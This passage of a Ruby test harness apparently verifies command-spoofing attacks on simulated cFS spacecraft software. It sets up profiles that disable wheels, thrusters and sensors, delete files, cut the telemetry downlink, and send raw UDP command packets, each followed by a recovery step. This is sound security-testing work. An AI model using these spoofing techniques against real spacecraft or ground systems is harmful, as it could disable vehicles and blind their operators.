    'TO_DEBUG TO_DEBUG_NOOP_CC',
    -> { read_to_lab }
  )
end

def read_to_lab
  request_to_lab_hk
  {
    sequence: tlm_i('TO_DEBUG', 'TO_DEBUG_HKPACKET', 'CCSDS_SEQUENCE'),
    cmd_count: tlm_i_first([['TO_DEBUG', 'TO_DEBUG_HKPACKET', 'CMDCOUNTER'], ['CFS', 'TO_DEBUG_HKPACKET', 'CMDCOUNTER']]),
    err_count: tlm_i_first([['TO_DEBUG', 'TO_DEBUG_HKPACKET', 'ERRCOUNTER'], ['CFS', 'TO_DEBUG_HKPACKET', 'ERRCOUNTER']])
  }
end

# The output-enable and remove-all commands can deliberately make TO_LAB's
# *own* telemetry and EVS packets unreachable from COSMOS.  An EVS packet is
# useful when it arrives, but its absence is not evidence that either command
# failed.  The normal verifier pre-attack HK read establishes a live stream;
# issue several genuine TO_LAB HK requests after the spoof and
# require all of them to remain at the last known sequence.  This is target
# telemetry/link evidence, rather than an attacker-side acknowledgement.
def observe_to_lab_downlink_interruption(baseline, probes: 3)
  expected_sequence = baseline.fetch(:sequence).to_i
  observations = probes.times.map do
    read_to_lab.merge(observed_at: Time.now.utc.iso8601)
  end
  sequences = observations.map { |state| state[:sequence].to_i }
  {
    baseline_sequence: expected_sequence,
    observed_sequences: sequences,
    probes: observations,
    # A response with a new sequence means the target still has a working
    # ground downlink.  All probes retaining the known packet establishes the
    # intended target-side loss of that downlink.
    verified_interruption: sequences.all? { |sequence| sequence == expected_sequence }
  }
rescue Exception => error
  {
    verified_interruption: false,
    error_class: error.class.to_s,
    error: error.message,
    probes: []
  }
end

def recover_to_lab_output
  cmd_optional('TO_DEBUG TO_DEBUG_ENABLE_OUTPUT_CC with DEST_IP cosmos, DEST_PORT 5013')
  sleep(0.6)
  read_to_lab
end

def restart_to_lab
  before_sequence = read_to_lab[:sequence].to_i
  cmd_first(['CFE CFE_ES_RESTART_APP with APPLICATION TO_LAB_APP', 'CFS CFE_ES_RESTART_APP with APPLICATION TO_LAB_APP'])
  sleep(2.0)
  result = wait_until(12.0, 0.8) do
    state = recover_to_lab_output
    { matched: state[:sequence].to_i != before_sequence, state: state }
  end
  result[:state].merge(recovery_observed: result[:matched], recovery_baseline_sequence: before_sequence)
end

def read_sch
  cmd_optional('CFS SCH_SEND_DIAG_TLM')
  sleep(1.0)
  entry_states_1 = tlm_i_first([['CFS', 'SCH_DIAGPACKET', 'ENTRYSTATES_1'], ['SCH', 'SCH_DIAGPACKET', 'ENTRYSTATES_1']])
  {
    cmd_count: tlm_i_first([['CFS', 'SCH_HKPACKET', 'CMDCOUNTER'], ['SCH', 'SCH_HKPACKET', 'CMDCOUNTER']]),
    err_count: tlm_i_first([['CFS', 'SCH_HKPACKET', 'ERRCOUNTER'], ['SCH', 'SCH_HKPACKET', 'ERRCOUNTER']]),
    table_pass_count: tlm_i_first([['CFS', 'SCH_HKPACKET', 'TABLEPASSCOUNT'], ['SCH', 'SCH_HKPACKET', 'TABLEPASSCOUNT']]),
    # SCH packs the fifth entry state (slot 0 / entry 4) in bits 7:6 of the
    # first diagnostic word: 0=unused, 1=enabled, 2=disabled.
    entry_0_4_state: (entry_states_1 >> 6) & 0x3
  }
end

def set_sch_entry_enabled(slot, entry, enabled)
  before = read_sch
  cmd_name = enabled ? 'SCH_ENABLE' : 'SCH_DISABLE'
  cmd("CFS #{cmd_name} with SLOTNUMBER #{slot}, ENTRYNUMBER #{entry}")
  desired_state = enabled ? 1 : 2
  result = wait_until(20.0, 1.0) do
    state = read_sch
    matched = state[:entry_0_4_state] == desired_state && state[:err_count] == before[:err_count]
    { matched: matched, state: state }
  end
  unless result[:matched]
    raise PreconditionNotMet,
          "SCH entry #{slot}/#{entry} did not reach required #{enabled ? 'enabled' : 'disabled'} state before spoof"
  end

  result[:state]
end

def read_sc
  cmd_optional('CFS SC_SEND_HK')
  sleep(0.4)
  {
    cmd_count: tlm_i_first([['SC', 'SC_HKTLM', 'CMDCTR'], ['CFS', 'SC_HKTLM', 'CMDCTR']]),
    err_count: tlm_i_first([['SC', 'SC_HKTLM', 'CMDERRCTR'], ['CFS', 'SC_HKTLM', 'CMDERRCTR']]),
    rts_active_count: tlm_i_first([['SC', 'SC_HKTLM', 'RTSACTIVECTR'], ['CFS', 'SC_HKTLM', 'RTSACTIVECTR']]),
    rts_active_err_count: tlm_i_first([['SC', 'SC_HKTLM', 'RTSACTIVEERRCTR'], ['CFS', 'SC_HKTLM', 'RTSACTIVEERRCTR']]),
    rts_disabled_status_1: tlm_i_first([['SC', 'SC_HKTLM', 'RTSDISABLEDSTATUS_1'], ['CFS', 'SC_HKTLM', 'RTSDISABLEDSTATUS_1']])
  }
end

def send_sc_rts_state_command(rts_id, disabled)
  if disabled
    # SC_RtsCmd_t is 12 bytes (RTSID plus a 16-bit padding member), while
    # the installed CFS dictionary advertises SC_DISABLE_RTS as a 10-byte
    # packet.  Use the same real CI_LAB ground-command path but construct
    # the actual C structure: CCSDS headers are network order and the CFS
    # payload is native little-endian.
    packet = cfe_command_packet(SC_CMD_MID, SC_DISABLE_RTS_CC, [rts_id, 0].pack('v v'))
    UDPSocket.open { |socket| socket.send(packet, 0, SP001_CI_HOST, SP001_CI_PORT) }
  else
    cmd("CFS SC_ENABLE_RTS with RTSID #{rts_id}, PADDING 0")
  end
  sleep(0.4)
end

def set_sc_rts_disabled(rts_id, disabled)
  before = read_sc
  send_sc_rts_state_command(rts_id, disabled)
  result = wait_until do
    state = read_sc
    observed_disabled = (state[:rts_disabled_status_1] & 1) != 0
    matched = state[:cmd_count] > before[:cmd_count] &&
              state[:err_count] == before[:err_count] &&
              observed_disabled == disabled
    { matched: matched, state: state }
  end
  unless result[:matched]
    raise PreconditionNotMet,
          "SC RTS #{rts_id} did not reach required #{disabled ? 'disabled' : 'enabled'} state before spoof"
  end

  result[:state]
end

def stop_sc_rts(rts_id)
  before = read_sc
  cmd("CFS SC_STOP_RTS with RTSID #{rts_id}, PADDING 0")
  result = wait_until do
    state = read_sc
    {
      matched: state[:cmd_count] > before[:cmd_count] && state[:err_count] == before[:err_count],
      state: state
    }
  end
  raise PreconditionNotMet, "SC RTS #{rts_id} did not accept normal stop during recovery" unless result[:matched]

  result[:state]
end

$sc_rts_toggle_observable = nil

def require_sc_rts_toggle_observable!
  return if $sc_rts_toggle_observable == true
  raise SkipProfile, 'SC RTS enable/disable state is not observable in current NOS3 run' if $sc_rts_toggle_observable == false

  original = read_sc
  original_disabled = (original[:rts_disabled_status_1] & 1) != 0
  disabled_state = set_sc_rts_disabled(1, true)
  disabled_observed = (disabled_state[:rts_disabled_status_1] & 1) != 0
  restored_state = set_sc_rts_disabled(1, original_disabled)
  restored_observed = ((restored_state[:rts_disabled_status_1] & 1) != 0) == original_disabled
  $sc_rts_toggle_observable = disabled_observed && restored_observed
  raise SkipProfile, 'SC RTS enable/disable state is not observable in current NOS3 run' unless $sc_rts_toggle_observable
end

def read_lc
  cmd_optional('CFS LC_SEND_Hk')
  sleep(0.4)
  {
    cmd_count: tlm_i_first([['LC', 'LC_HKPACKET', 'CMDCOUNT'], ['CFS', 'LC_HKPACKET', 'CMDCOUNT']]),
    err_count: tlm_i_first([['LC', 'LC_HKPACKET', 'CMDERRCOUNT'], ['CFS', 'LC_HKPACKET', 'CMDERRCOUNT']]),
    state: tlm_i_first([['LC', 'LC_HKPACKET', 'CURRENTLCSTATE'], ['CFS', 'LC_HKPACKET', 'CURRENTLCSTATE']], LC_STATE_VALUES),
    active_aps: tlm_i_first([['LC', 'LC_HKPACKET', 'ACTIVEAPS'], ['CFS', 'LC_HKPACKET', 'ACTIVEAPS']])
  }
end

def set_lc_state(state)
  cmd("CFS LC_SET_LC_STATE with NEWLCSTATE #{state}")
  wait_until { lc = read_lc; { matched: lc[:state] == state, state: lc } }[:state]
end

def read_cf
  cmd_optional('CFS CF_SEND_HK')
  sleep(0.5)
  {
    cmd_count: tlm_i_first([['CFS', 'CF_HKPACKET', 'CMDCOUNTER'], ['CF', 'CF_HKPACKET', 'CMDCOUNTER']]),
    err_count: tlm_i_first([['CFS', 'CF_HKPACKET', 'ERRCOUNTER'], ['CF', 'CF_HKPACKET', 'ERRCOUNTER']]),
    ch0_frozen: tlm_i_first([['CFS', 'CF_HKPACKET', 'CH1_FROZEN'], ['CF', 'CF_HKPACKET', 'CH1_FROZEN']]),
    ch1_frozen: tlm_i_first([['CFS', 'CF_HKPACKET', 'CH2_FROZEN'], ['CF', 'CF_HKPACKET', 'CH2_FROZEN']])
  }
end

def set_cf_frozen(channel, frozen)
  before = read_cf
  sp001_run_profile(frozen ? 240 : 241, [channel])
  key = channel == 1 ? :ch1_frozen : :ch0_frozen
  wait_until do
    cf = read_cf
    counter_accepted = cf[:cmd_count] > before[:cmd_count] && cf[:err_count] == before[:err_count]
    state_observed = frozen ? cf[key] != 0 : cf[key] == 0
    { matched: counter_accepted && state_observed, state: cf }
  end[:state]
end

def read_tbl
  {
    cmd_count: tlm_i('CFS', 'CFE_TBL_HKPACKET', 'CMDCOUNTER'),
    err_count: tlm_i('CFS', 'CFE_TBL_HKPACKET', 'ERRCOUNTER'),
    num_load_pending: tlm_i('CFS', 'CFE_TBL_HKPACKET', 'NUMLOADPENDING'),
    num_val_requests: tlm_i('CFS', 'CFE_TBL_HKPACKET', 'NUMVALREQUESTS'),
    last_file_loaded: tlm_s_first([['CFS', 'CFE_TBL_HKPACKET', 'LASTFILELOADED']]),
    last_table_loaded: tlm_s_first([['CFS', 'CFE_TBL_HKPACKET', 'LASTTABLELOADED']]),
    last_val_table: tlm_s_first([['CFS', 'CFE_TBL_HKPACKET', 'LASTVALTABLENAME']])
  }
end

def read_es
  {
    cmd_count: tlm_i('CFS', 'CFE_ES_HKPACKET', 'CMDCOUNTER'),
    err_count: tlm_i('CFS', 'CFE_ES_HKPACKET', 'ERRCOUNTER'),
    registered_external_apps: tlm_i('CFS', 'CFE_ES_HKPACKET', 'REGISTEREDEXTERNALAPPS')
  }
end

def query_es_app(name)
  result = cmd_first(["CFE CFE_ES_QUERY_ONE with APPLICATION #{name}", "CFS CFE_ES_QUERY_ONE with APPLICATION #{name}"])
  raise "CFE_ES_QUERY_ONE failed for #{name}: #{result[:errors].inspect}" unless result[:ok]

  sleep(0.8)
  {
    name: tlm_s_first([['CFS', 'CFE_ES_ONEAPPTLM', 'APPINFO_NAME']]),
    filename: tlm_s_first([['CFS', 'CFE_ES_ONEAPPTLM', 'APPINFO_FILENAME']])
  }
rescue Exception => error
  { error_class: error.class.to_s, error: error.message }
end

def start_ds
  before = read_ds
  result = cmd_first(['CFE CFE_ES_START_APP with APPLICATION DS, APPENTRYPOINT DS_AppMain, APPFILENAME /cf/ds.so, STACKSIZE 32768, EXCEPTIONACTION 0, PRIORITY 51',
                      'CFS CFE_ES_START_APP with APPLICATION DS, APPENTRYPOINT DS_AppMain, APPFILENAME /cf/ds.so, STACKSIZE 32768, EXCEPTIONACTION 0, PRIORITY 51'])
  raise "CFE_ES_START_APP DS failed: #{result[:errors].inspect}" unless result[:ok]

  wait_until(8.0, 0.8) do
    state = read_ds
    { matched: state[:cmd_count] > before[:cmd_count], state: state }
  end[:state]
end

def restart_fm
  before = read_fm
  cmd_first(['CFE CFE_ES_START_APP with APPLICATION FM, APPENTRYPOINT FM_AppMain, APPFILENAME /cf/fm.so, STACKSIZE 32768, EXCEPTIONACTION 0, PRIORITY 52',
             'CFS CFE_ES_START_APP with APPLICATION FM, APPENTRYPOINT FM_AppMain, APPFILENAME /cf/fm.so, STACKSIZE 32768, EXCEPTIONACTION 0, PRIORITY 52'])
  wait_until(8.0, 0.8) do
    state = read_fm
    { matched: state[:cmd_count] > before[:cmd_count], state: state }
  end[:state]
end

def make_profiles
  [
    {
      name: 'adcs_set_mode',
      id: 1,
      risk: 'safe',
      target: 'GENERIC_ADCS',
      args: ->(ctx) { [ctx[:target_mode]] },
      prepare: lambda do |original|
        baseline = original[:mode] == 2 ? 1 : original[:mode]
        set_adcs_mode(baseline) if original[:mode] != baseline
        { original: original, target_mode: 2 }
      end,
      read: method(:read_adcs),
      passed: lambda do |before, after, ctx|
        common_counter_evidence(before, after).merge(
          baseline_not_target_mode: before[:mode] != ctx[:target_mode],
          mode_changed: after[:mode] == ctx[:target_mode]
        )
      end,
      recover: ->(ctx) { set_adcs_mode(ctx[:original][:mode]) },
      recovered: ->(ctx, state) { state[:mode] == ctx[:original][:mode] }
    },
    {
      name: 'adcs_momentum_management',
      id: 2,
      risk: 'safe',
      target: 'GENERIC_ADCS',
      args: ->(ctx) { [ctx[:target_state]] },
      prepare: lambda do |original|
        target = original[:h_mgmton] == 1 ? 0 : 1
        { original: original, target_state: target }
      end,
      read: method(:read_adcs),
      passed: lambda do |before, after, ctx|
        common_counter_evidence(before, after).merge(momentum_state_changed: after[:h_mgmton] == ctx[:target_state])
      end,
      recover: ->(ctx) { set_adcs_momentum(ctx[:original][:h_mgmton]) },
      recovered: ->(ctx, state) { state[:h_mgmton] == ctx[:original][:h_mgmton] }
    },
    {
      name: 'torquer_percent_on',
      id: 12,
      risk: 'safe',
      target: 'GENERIC_TORQUER',
      args: ->(_ctx) { [0, 1, 7] },
      prepare: lambda do |original|
        set_torquer_enabled(1) if original[:enabled] != 1
        set_torquer_percent(0, 0, 0)
        { original: original }
      end,
      read: method(:read_torquer),
      passed: lambda do |before, after, _ctx|
        common_counter_evidence(before, after).merge(torquer0_percent_changed: after[:dir0] == 1 && after[:pct0] == 7)
      end,
      recover: lambda do |ctx|
        restore_torquer_state(ctx[:original])
      end,
      recovered: ->(ctx, state) { torquer_matches?(state, ctx[:original]) }
    },
    {
      name: 'torquer_all_percent_on',
      id: 13,
      risk: 'safe',
      target: 'GENERIC_TORQUER',
      args: ->(_ctx) { [1, 5] },
      prepare: lambda do |original|
        set_torquer_enabled(1) if original[:enabled] != 1
        set_torquer_all(0, 0)
        { original: original }
      end,
      read: method(:read_torquer),
      passed: lambda do |before, after, _ctx|
        common_counter_evidence(before, after).merge(
          all_torquer_percent_changed: [0, 1, 2].all? { |idx| after[:"dir#{idx}"] == 1 && after[:"pct#{idx}"] == 5 }
        )
      end,
      recover: lambda do |ctx|
        restore_torquer_state(ctx[:original])
      end,
      recovered: ->(ctx, state) { torquer_matches?(state, ctx[:original]) }
    },
    {
      name: 'rw_set_torque',
      id: 20,
      risk: 'safe',
      target: 'GENERIC_REACTION_WHEEL',
      args: ->(_ctx) { [0, 25] },
      prepare: lambda do |original|
        set_rw_enabled(0, 1) if original[:enabled_rw0] != 1
        { original: original }
      end,
      read: method(:read_rw),
      passed: lambda do |before, after, _ctx|
        {
          command_counter_increased: after[:cmd_count] > before[:cmd_count],
          device_counter_not_decreased: after[:device_count_rw0] >= before[:device_count_rw0],
          error_counter_unchanged: after[:err_count] == before[:err_count]
        }
      end,
      recover: lambda do |ctx|
        set_rw_torque(0, 0)
        set_rw_enabled(0, ctx[:original][:enabled_rw0]) if read_rw[:enabled_rw0] != ctx[:original][:enabled_rw0]
        read_rw
      end,
      recovered: ->(ctx, state) { state[:enabled_rw0] == ctx[:original][:enabled_rw0] }
    },
    {
      name: 'ds_set_app_state',
      id: 40,
      risk: 'safe',
      target: 'DS',
      args: ->(_ctx) { [0] },
      prepare: lambda do |original|
        set_ds_app_state(1) if original[:app_state] != 1
        { original: original }
      end,
      read: method(:read_ds),
      passed: lambda do |before, after, _ctx|
        common_counter_evidence(before, after).merge(ds_app_disabled: after[:app_state] == 0)
      end,
      recover: ->(ctx) { set_ds_app_state(ctx[:original][:app_state]) },
      recovered: ->(ctx, state) { state[:app_state] == ctx[:original][:app_state] }
    },
    {
      name: 'ds_set_dest_state',
      id: 41,
      risk: 'safe',
      target: 'DS',
      args: ->(_ctx) { [0, 0] },
      prepare: lambda do |original|
        set_ds_dest_state(0, 1) if original[:enable_state0] != 1
        { original: original }
      end,
      read: method(:read_ds_file_info),
      passed: lambda do |before, after, _ctx|
        common_counter_evidence(before, after).merge(ds_dest0_disabled: after[:enable_state0] == 0)
      end,
      recover: ->(ctx) { set_ds_dest_state(0, ctx[:original][:enable_state0]) },
      recovered: ->(ctx, state) { state[:enable_state0] == ctx[:original][:enable_state0] }
    },
    {
      name: 'fm_create_dir',
      id: 50,
      risk: 'safe',
      target: 'FM',
      args: ->(_ctx) { [] },
      prepare: lambda do |original|
        ensure_fm_dir_absent(FM_SAFE_DIR)
        { original: original }
      end,
      read: -> { fm_file_info(FM_SAFE_DIR) },
      passed: lambda do |before, after, _ctx|
        {
          directory_created: fm_effective_directory?(after),
          fm_error_counter_unchanged: after[:err_count] == before[:err_count]
        }
      end,
      recover: ->(_ctx) { fm_delete_dir_if_present(FM_SAFE_DIR) },
      recovered: ->(_ctx, state) { fm_effective_missing?(state) }
    },
    {
      name: 'torquer_enable',
      id: 10,
      risk: 'hazardous',
      target: 'GENERIC_TORQUER',
      args: ->(_ctx) { [] },
      prepare: lambda do |original|
        set_torquer_enabled(0) if original[:enabled] != 0
        { original: original }
      end,
      read: method(:read_torquer),
      passed: ->(before, after, _ctx) { common_counter_evidence(before, after).merge(torquer_enabled: after[:enabled] == 1) },
      recover: ->(ctx) { set_torquer_enabled(ctx[:original][:enabled]) },
      recovered: ->(ctx, state) { state[:enabled] == ctx[:original][:enabled] }
    },
    {
      name: 'torquer_disable',
      id: 11,
      risk: 'hazardous',
      target: 'GENERIC_TORQUER',
      args: ->(_ctx) { [] },
      prepare: lambda do |original|
        set_torquer_enabled(1) if original[:enabled] != 1
        { original: original }
      end,
      read: method(:read_torquer),
      passed: ->(before, after, _ctx) { common_counter_evidence(before, after).merge(torquer_disabled: after[:enabled] == 0) },
      recover: ->(ctx) { set_torquer_enabled(ctx[:original][:enabled]) },
      recovered: ->(ctx, state) { state[:enabled] == ctx[:original][:enabled] }
    },
    {
      name: 'rw_enable',
      id: 21,
      risk: 'hazardous',
      target: 'GENERIC_REACTION_WHEEL',
      args: ->(_ctx) { [0] },
      prepare: lambda do |original|
        set_rw_enabled(0, 0) if original[:enabled_rw0] != 0
        { original: original, expected_note: 'Fails if SP001 profile still transmits RW enable as no-args instead of GENERIC_RW_Cmd_t' }
      end,
      read: method(:read_rw),
      passed: ->(before, after, _ctx) { common_counter_evidence(before, after).merge(rw0_enabled: after[:enabled_rw0] == 1) },
      recover: lambda do |ctx|
        set_rw_enabled(0, ctx[:original][:enabled_rw0]) if read_rw[:enabled_rw0] != ctx[:original][:enabled_rw0]
        read_rw
      end,
      recovered: ->(ctx, state) { state[:enabled_rw0] == ctx[:original][:enabled_rw0] }
    },
    {
      name: 'rw_disable',
      id: 22,
      risk: 'hazardous',
      target: 'GENERIC_REACTION_WHEEL',
      args: ->(_ctx) { [0] },
      prepare: lambda do |original|
        set_rw_enabled(0, 1) if original[:enabled_rw0] != 1
        { original: original, expected_note: 'Fails if SP001 profile still transmits RW disable as no-args instead of GENERIC_RW_Cmd_t' }
      end,
      read: method(:read_rw),
      passed: ->(before, after, _ctx) { { command_counter_increased: after[:cmd_count] > before[:cmd_count], rw0_disabled: after[:enabled_rw0] == 0 } },
      recover: lambda do |ctx|
        set_rw_enabled(0, ctx[:original][:enabled_rw0]) if read_rw[:enabled_rw0] != ctx[:original][:enabled_rw0]
        read_rw
      end,
      recovered: ->(ctx, state) { state[:enabled_rw0] == ctx[:original][:enabled_rw0] }
    },
    {
      name: 'eps_switch',
      id: 30,
      risk: 'hazardous',
      target: 'GENERIC_EPS',
      args: ->(ctx) { [0, ctx[:target_state]] },
      prepare: lambda do |original|
        target = original[:switch0] == 0xAA ? 0x00 : 0xAA
        { original: original, target_state: target }
      end,
      read: method(:read_eps),
      passed: lambda do |before, after, ctx|
        common_counter_evidence(before, after).merge(eps_switch0_changed: after[:switch0] == ctx[:target_state])
      end,
      recover: ->(ctx) { set_eps_switch(0, ctx[:original][:switch0]) },
      recovered: ->(ctx, state) { state[:switch0] == ctx[:original][:switch0] }
    },
    {
      name: 'fm_delete_file',
      id: 51,
      risk: 'hazardous',
      target: 'FM',
      args: ->(_ctx) { [] },
      prepare: lambda do |original|
        fm_copy_file(FM_DELETE_FILE)
        { original: original }
      end,
      read: -> { fm_file_info(FM_DELETE_FILE) },
      passed: ->(before, after, _ctx) { { file_existed_before: fm_effective_file?(before), file_deleted: fm_effective_missing?(after) } },
      recover: ->(_ctx) { fm_delete_file_if_present(FM_DELETE_FILE) },
      recovered: ->(_ctx, state) { fm_effective_missing?(state) }
    },
    {
      name: 'fm_delete_all',
      id: 52,
      risk: 'hazardous',
      target: 'FM',
      args: ->(_ctx) { [] },
      prepare: lambda do |original|
        fm_create_dir(FM_DELETE_ALL_DIR)
        fm_copy_file(FM_DELETE_ALL_FILE1)
        fm_copy_file(FM_DELETE_ALL_FILE2)
        { original: original }
      end,
      read: -> { { dir: fm_file_info(FM_DELETE_ALL_DIR), one: fm_file_info(FM_DELETE_ALL_FILE1), two: fm_file_info(FM_DELETE_ALL_FILE2) } },
      passed: lambda do |before, after, _ctx|
        {
          files_existed_before: fm_effective_file?(before[:one]) && fm_effective_file?(before[:two]),
          directory_preserved: fm_effective_directory?(after[:dir]),
          files_deleted: fm_effective_missing?(after[:one]) && fm_effective_missing?(after[:two])
        }
      end,
      recover: lambda do |_ctx|
        fm_delete_file_if_present(FM_DELETE_ALL_FILE1)
        fm_delete_file_if_present(FM_DELETE_ALL_FILE2)
        fm_delete_dir_if_present(FM_DELETE_ALL_DIR)
      end,
      recovered: ->(_ctx, state) { fm_effective_missing?(state) }
    },
    {
      name: 'fm_set_file_perm',
      id: 53,
      risk: 'hazardous',
      target: 'FM',
      args: ->(ctx) { [ctx[:target_access_mode]] },
      prepare: lambda do |original|
        info = prepare_fm_perm_file
        {
          original: original,
          original_mode: fm_effective_mode(info),
          target_access_mode: FM_OS_READ_WRITE,
          expected_mode: FM_PERM_EXPECTED_READ_WRITE_MODE
        }
      end,
      read: -> { fm_file_info(FM_PERM_FILE) },
      passed: lambda do |_before, after, ctx|
        {
          file_permission_changed: fm_effective_mode(after) != ctx[:original_mode],
          file_permission_expected: fm_effective_mode(after) == ctx[:expected_mode]
        }
      end,
      recover: lambda do |ctx|
        ctx[:original_mode]
        fm_delete_file_if_present(FM_PERM_FILE)
      end,
      recovered: ->(_ctx, state) { fm_effective_missing?(state) }
    },
    {
      name: 'fm_delete_dir',
      id: 54,
      risk: 'hazardous',
      target: 'FM',
      args: ->(_ctx) { [] },
      prepare: lambda do |original|
        fm_create_dir(FM_DELETE_DIR)
        { original: original }
      end,
      read: -> { fm_file_info(FM_DELETE_DIR) },
      passed: ->(before, after, _ctx) { { directory_existed_before: fm_effective_directory?(before), directory_deleted: fm_effective_missing?(after) } },
      recover: ->(_ctx) { fm_delete_dir_if_present(FM_DELETE_DIR) },
      recovered: ->(_ctx, state) { fm_effective_missing?(state) }
    },
    component_enable_profile('thruster_enable', 60, 'GENERIC_THRUSTER', 1, 'hazardous'),
    component_enable_profile('thruster_disable', 61, 'GENERIC_THRUSTER', 0, 'hazardous'),
    {
      name: 'thruster_percentage',
      id: 62,
      risk: 'hazardous',
      target: 'GENERIC_THRUSTER',
      applicable: -> { require_telemetry_target!('GENERIC_THRUSTER'); require_command_target!('GENERIC_THRUSTER') },
      args: ->(_ctx) { [0, 5] },
      prepare: lambda do |original|
        set_thruster_enabled(1) if original[:enabled] != 1
        { original: original }
      end,
      read: method(:read_thruster),
      passed: ->(before, after, _ctx) { counter_or_device_evidence(before, after) },
      recover: ->(ctx) { set_thruster_enabled(ctx[:original][:enabled]) },
      recovered: ->(ctx, state) { state[:enabled] == ctx[:original][:enabled] }
    },
    {
      name: 'radio_config',
      id: 70,
      risk: 'hazardous',
      target: 'GENERIC_RADIO',
      args: ->(_ctx) { [1] },
      prepare: ->(original) { { original: original } },
      read: method(:read_radio),
      passed: ->(before, after, _ctx) { target_counter_evidence(before, after) },
      recover: ->(_ctx) { read_radio },
      recovered: ->(_ctx, _state) { true }
    },
    {
      name: 'radio_proximity',
      id: 71,
      risk: 'hazardous',
      target: 'GENERIC_RADIO',
      args: ->(_ctx) { [1, 0x42] },
      prepare: ->(original) { { original: original } },
      read: method(:read_radio),
      passed: lambda do |before, after, _ctx|
        {
          forward_counter_changed: after[:forward_count] != before[:forward_count] || after[:forward_err_count] != before[:forward_err_count],
          command_error_counter_unchanged: after[:err_count] == before[:err_count]
        }
      end,
      recover: ->(_ctx) { read_radio },
      recovered: ->(_ctx, _state) { true }
    },
    component_enable_profile('novatel_enable', 80, 'NOVATEL_OEM615', 1, 'hazardous', -> { require_novatel_observable! }),
    component_enable_profile('novatel_disable', 81, 'NOVATEL_OEM615', 0, 'hazardous', -> { require_novatel_observable! }),
    command_counter_profile('novatel_log', 82, 'hazardous', 'NOVATEL_OEM615', ->(_ctx) { [0, 1] }, -> { read_component_hk('NOVATEL_OEM615') }, nil, -> { require_novatel_observable! }),
    command_counter_profile('novatel_unlog', 83, 'hazardous', 'NOVATEL_OEM615', ->(_ctx) { [0] }, -> { read_component_hk('NOVATEL_OEM615') }, nil, -> { require_novatel_observable! }),
    command_counter_profile('novatel_unlogall', 84, 'hazardous', 'NOVATEL_OEM615', ->(_ctx) { [] }, -> { read_component_hk('NOVATEL_OEM615') }, nil, -> { require_novatel_observable! }),
    command_counter_profile('novatel_serialconfig', 85, 'hazardous', 'NOVATEL_OEM615', ->(_ctx) { [] }, -> { read_component_hk('NOVATEL_OEM615') }, nil, -> { require_novatel_observable! }),
    component_enable_profile('imu_enable', 90, 'GENERIC_IMU', 1, 'hazardous'),
    component_enable_profile('imu_disable', 91, 'GENERIC_IMU', 0, 'hazardous'),
    component_enable_profile('mag_enable', 100, 'GENERIC_MAG', 1, 'hazardous'),
    component_enable_profile('mag_disable', 101, 'GENERIC_MAG', 0, 'hazardous'),
    component_enable_profile('css_enable', 110, 'GENERIC_CSS', 1, 'hazardous'),
    component_enable_profile('css_disable', 111, 'GENERIC_CSS', 0, 'hazardous'),
    component_enable_profile('fss_enable', 120, 'GENERIC_FSS', 1, 'hazardous'),
    component_enable_profile('fss_disable', 121, 'GENERIC_FSS', 0, 'hazardous'),
    component_enable_profile('star_tracker_enable', 130, 'GENERIC_STAR_TRACKER', 1, 'hazardous'),
    component_enable_profile('star_tracker_disable', 131, 'GENERIC_STAR_TRACKER', 0, 'hazardous'),
    {
      name: 'to_lab_output_enable',
      id: 200,
      risk: 'hazardous',
      target: 'TO_LAB',
      applicable: -> { require_to_lab_observable! },
      args: ->(_ctx) { [] },
      prepare: ->(original) { { original: original } },
      read: method(:read_to_lab),
      event_evidence: { app_name: 'TO_LAB_APP', message_pattern: /TO telemetry output enabled for IP 127\.0\.0\.1/ },
      post_attack: ->(ctx, before) { ctx[:to_lab_downlink_evidence] = observe_to_lab_downlink_interruption(before) },
      passed: lambda do |_before, _after, ctx|
        {
          output_redirected_off_ground: ctx.dig(:to_lab_downlink_evidence, :verified_interruption) == true
        }
      end,
      recover: ->(_ctx) { recover_to_lab_output },
      recovered: ->(_ctx, state) { state[:sequence].to_i > 0 }
    },
    {
      name: 'to_lab_remove_adcs_hk',
      id: 201,
      risk: 'hazardous',
      target: 'TO_LAB',
      applicable: -> { require_to_lab_observable! },
      # GENERIC_ADCS_HK_TLM_MID.  0x0880 is the legacy TO housekeeping
      # packet and is not a subscription owned by TO_LAB.
      args: ->(_ctx) { [0x0941] },
      prepare: ->(original) { { original: original } },
      read: method(:read_to_lab),
      event_evidence: { app_name: 'TO_LAB_APP', message_pattern: /TO RemovePkt 0x941/ },
      passed: ->(_before, _after, ctx) { { adcs_hk_subscription_removed: ctx.dig(:attack_event, :matched) == true } },
      recover: ->(_ctx) { restart_to_lab },
      recovered: ->(_ctx, state) { state[:recovery_observed] == true }
    },
    {
      name: 'to_lab_remove_all',
      id: 202,
      risk: 'hazardous',
      target: 'TO_LAB',
      applicable: -> { require_to_lab_observable! },
      args: ->(_ctx) { [] },
      prepare: ->(original) { { original: original } },
      read: method(:read_to_lab),
      event_evidence: { app_name: 'TO_LAB_APP', message_pattern: /TO Unsubscribed to all Commands and Telemetry/ },
      post_attack: ->(ctx, before) { ctx[:to_lab_downlink_evidence] = observe_to_lab_downlink_interruption(before) },
      passed: lambda do |_before, _after, ctx|
        {
          all_to_lab_subscriptions_removed: ctx.dig(:to_lab_downlink_evidence, :verified_interruption) == true
        }
      end,
      recover: ->(_ctx) { restart_to_lab },
      recovered: ->(_ctx, state) { state[:recovery_observed] == true }
    },
    {
      name: 'sch_disable_entry',
      id: 211,
      risk: 'hazardous',
      target: 'SCH',
      applicable: -> { require_command_target!('CFS', 'CFS command target is not loaded; SCH recovery commands cannot be verified') },
      args: ->(_ctx) { [0, 4] },
      prepare: lambda do |original|
        set_sch_entry_enabled(0, 4, true)
        { original: original }
      end,
      read: method(:read_sch),
      passed: lambda do |before, after, _ctx|
        {
          sch_entry_disabled: after[:entry_0_4_state] == 2,
          error_counter_unchanged: after[:err_count] == before[:err_count],
          table_pass_count_observable: after[:table_pass_count] >= before[:table_pass_count]
        }
      end,
      recover: ->(_ctx) { set_sch_entry_enabled(0, 4, true) },
      recovered: ->(_ctx, _state) { true }
    },
    {
      name: 'sch_enable_entry',
      id: 210,
      risk: 'hazardous',
      target: 'SCH',
      applicable: -> { require_command_target!('CFS', 'CFS command target is not loaded; SCH recovery commands cannot be verified') },
      args: ->(_ctx) { [0, 4] },
      prepare: lambda do |original|
        set_sch_entry_enabled(0, 4, false)
        { original: original }
      end,
      read: method(:read_sch),
      passed: lambda do |before, after, _ctx|
        {
          sch_entry_enabled: after[:entry_0_4_state] == 1,
          error_counter_unchanged: after[:err_count] == before[:err_count],
          table_pass_count_observable: after[:table_pass_count] >= before[:table_pass_count]
        }
      end,
